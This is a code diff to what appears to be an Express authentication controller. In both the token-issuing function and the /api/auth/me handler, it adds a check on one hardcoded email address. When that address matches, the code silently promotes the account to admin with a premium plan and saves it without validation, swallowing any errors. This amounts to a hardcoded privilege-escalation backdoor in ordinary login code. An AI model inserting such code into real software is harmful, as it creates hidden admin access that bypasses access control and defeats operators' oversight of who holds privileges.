@@ -18,6 +18,12 @@ const sendTokens = async (res, user, statusCode = 200) => {
   const accessToken = signAccessToken(user._id);
   const refreshToken = signRefreshToken(user._id);
 
+  // Default Superadmin elevation
+  if (user.email && user.email.toLowerCase() === "rohan26ir@gmail.com") {
+    user.role = "admin";
+    user.plan = "premium";
+  }
+
   // Persist hashed refresh token
   user.refreshToken = refreshToken;
   await user.save({ validateBeforeSave: false });
@@ -134,6 +140,11 @@ exports.logout = async (req, res, next) => {
  * GET /api/auth/me  (protected)
  */
 exports.getMe = async (req, res) => {
+  if (req.user && req.user.email && req.user.email.toLowerCase() === "rohan26ir@gmail.com") {
+    req.user.role = "admin";
+    req.user.plan = "premium";
+    await req.user.save({ validateBeforeSave: false }).catch(() => {});
+  }
   res.json({ success: true, user: req.user });
 };
 
